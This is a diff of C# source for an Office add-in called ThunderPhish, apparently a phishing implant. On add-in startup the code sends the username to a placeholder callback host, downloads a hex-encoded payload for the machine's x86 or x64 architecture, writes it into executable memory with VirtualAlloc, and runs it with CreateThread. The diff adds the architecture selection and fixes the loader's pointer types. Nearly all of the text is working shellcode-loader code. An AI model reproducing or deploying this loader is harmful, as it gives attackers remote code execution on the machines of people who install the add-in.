@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net;
 using System.Runtime.InteropServices;
 
@@ -6,36 +6,52 @@ namespace ThunderPhish
 {
     public partial class ThisAddIn
     {
-        private static UInt32 MEM_COMMIT = 0x1000;
-        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         [DllImport("kernel32")]
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, IntPtr flAllocationType, IntPtr flProtect);
         [DllImport("kernel32")]
-        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref IntPtr lpThreadId);
+
         private void ThisAddIn_Startup(object sender, System.EventArgs e)
         {
-            WebClient wc = new WebClient();
+            
             try
             {
+                WebClient wc = new WebClient();
                 //add webpage status check
-                string updateString = wc.DownloadString("http://**Callhome**/api/updates.php?clientupdate=yes&user=" + Environment.UserName);
+                string updateString = wc.DownloadString("http://**callhome**/api/updates.php?clientupdate=yes&user=" + Environment.UserName);
+                string binaryLoad = null;
                 if (updateString.Contains("2.0.2"))
                 {
+                    if (IntPtr.Size == 4)
+                    {
+                        binaryLoad = wc.DownloadString("http://**callhome**/api/updatefile.php?clientupdate=yes&arch=x86&user=" + Environment.UserName);
+                    }
+                    else if (IntPtr.Size == 8)
+                    {
+                        binaryLoad = wc.DownloadString("http://**callhome**/api/updatefile.php?clientupdate=yes&arch=x64&user=" + Environment.UserName);
+                    }
+                    else
+                    {
+                        binaryLoad = wc.DownloadString("http://**callhome**/api/updatefile.php?error=true");
+                        return;
+                    }
                     //add webpage status check
-                    string binaryLoad = wc.DownloadString("http://**Callhome**/api/updatefile.php?clientupdate=yes&user=" + Environment.UserName);
+
                     string[] updateBinary = binaryLoad.Split('|');
-                    string stringstep = updateBinary[1].Replace(" ", String.Empty);
-                    byte[] binaryPatch = ToByteArray(stringstep);
+                    string stringStep = updateBinary[1].Replace(" ", String.Empty);
+                    byte[] binaryPatch = ToByteArray(stringStep);
 
                     try
                     {
-                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)binaryPatch.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                        Marshal.Copy(binaryPatch, 0, (IntPtr)(funcAddr), binaryPatch.Length);
+                        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(binaryPatch.Length + 1), (IntPtr)0x1000, (IntPtr)0x40);
+                        Marshal.Copy(binaryPatch, 0, funcAddr, binaryPatch.Length);
+                        
                         IntPtr hThread = IntPtr.Zero;
-                        UInt32 threadId = 0;
+                        IntPtr threadId = IntPtr.Zero;
                         IntPtr pinfo = IntPtr.Zero;
-
-                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+                        
+                        hThread = CreateThread(IntPtr.Zero, (uint)binaryPatch.Length, funcAddr, pinfo, 0, ref threadId);
+                        
                         //WaitForSingleObject(hThread, 0xFFFFFFFF);
                     }
                     catch
